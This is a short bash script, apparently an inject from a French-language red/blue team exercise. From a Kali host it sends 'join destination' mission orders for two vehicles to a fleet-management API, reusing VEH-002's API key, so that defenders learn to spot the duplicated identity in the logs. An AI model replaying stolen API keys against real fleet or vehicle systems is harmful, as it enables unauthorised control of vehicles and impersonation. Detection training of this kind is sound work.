#!/usr/bin/env bash
# INJECT B6 - ordres de mission envoyes a deux vehicules avec la cle API de
# VEH-002, mais depuis KALI (IP differente de celle du vehicule).
# Trace attendue : flotte-tlm journalise identite_dupliquee=true.
set -euo pipefail
: "${IP_FLOTTE:?}"; : "${CLE_VEH002:?}"
curlj() { curl -sk -H "Content-Type: application/json" "$@"; }
echo "[B6] Envoi d'ordres avec la cle de VEH-002 depuis KALI"
for v in VEH-002 VEH-001; do
  curlj -X POST "http://$IP_FLOTTE:8080/api/ordres" \
    -d "{\"vehicule\":\"$v\",\"cle_api\":\"$CLE_VEH002\",\"destination\":\"Parc des Expos\",\"action\":\"rejoindre\"}"
  echo "  -> ordre envoye a $v"
done
echo "[B6] Si identite_dupliquee=true : la blue team doit reconnaitre une cle reutilisee."
